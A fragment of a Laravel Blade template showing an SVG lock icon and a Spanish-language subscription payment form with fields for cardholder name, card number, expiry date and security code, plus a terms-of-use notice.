                                <path color="#FEC418" d="M400,188h-36.037v-82.23c0-58.322-48.449-105.77-108-105.77c-59.551,0-108,47.448-108,105.77V188H112
			c-33.084,0-60,26.916-60,60v204c0,33.084,26.916,60,60,60h288c33.084,0,60-26.916,60-60V248C460,214.916,433.084,188,400,188z
			 M187.963,105.77c0-36.266,30.505-65.77,68-65.77s68,29.504,68,65.77V188h-136V105.77z M420,452c0,11.028-8.972,20-20,20H112
			c-11.028,0-20-8.972-20-20V248c0-11.028,8.972-20,20-20h288c11.028,0,20,8.972,20,20V452z" />
                            </g>
                        </g>
                            <g>
                                <g>
                                    <path color="#FEC418" d="M256,286c-20.435,0-37,16.565-37,37c0,13.048,6.76,24.51,16.963,31.098V398c0,11.045,8.954,20,20,20
			c11.045,0,20-8.955,20-20v-43.855C286.207,347.565,293,336.08,293,323C293,302.565,276.435,286,256,286z" />
                                </g>
                            </g>
                            <g>
                            </g>
                            <g>
                            </g>
                            <g>
                            </g>
                            <g>
                            </g>
                            <g>
                            </g>
                            <g>
                            </g>
                            <g>
                            </g>
                            <g>
                            </g>
                            <g>
                            </g>
                            <g>
                            </g>
                            <g>
                            </g>
                            <g>
                            </g>
                            <g>
                            </g>
                            <g>
                            </g>
                            <g>
                            </g>
                    </svg>


                    </p>


                    <input type="text" class="forminputpay" name="credit_name" placeholder="Nombre de la tarjeta" required>
                    <input type="text" class="forminputpay" name="surnames" placeholder="Apellidos" required>
                    <input type="text" class="forminputpay" name="credit_number" placeholder="Numero de la tarjeta" pattern="^(?:4\d([\- ])?\d{6}\1\d{5}|(?:4\d{3}|5[1-5]\d{2}|6011)([\- ])?\d{4}\2\d{4}\2\d{4})$" required>
                    <input type="text" class="forminputpay" name="date_venciment" placeholder="Fecha de vencimiento(MM/AA)" pattern="([0-9]{2}[/]?){2}" required>
                    <input type="password" class="forminputpay" name="security_code" placeholder="Codigo de seguridad" maxlength="3" pattern="/[0-9]{3}+/" required>
{{--                    <input type="password" class="forminputpay" name="tarifa" placeholder="tarifa">--}}
                    <p class="infolegal">Al hacer clic en el botón "Iniciar suscripción de pago" de más abajo, estás
                        aceptando nuestros Términos de uso, admites que ya has cumplido los 18 y
                        reconoces nuestra Declaración de privacidad.</p>
                    <input type="submit" class="pay-button" value="Iniciar suscripcion de pago" required>


                </div>
            </div>
        </form>
    </div>
    <div class="emptyspace2"></div>
@endsection
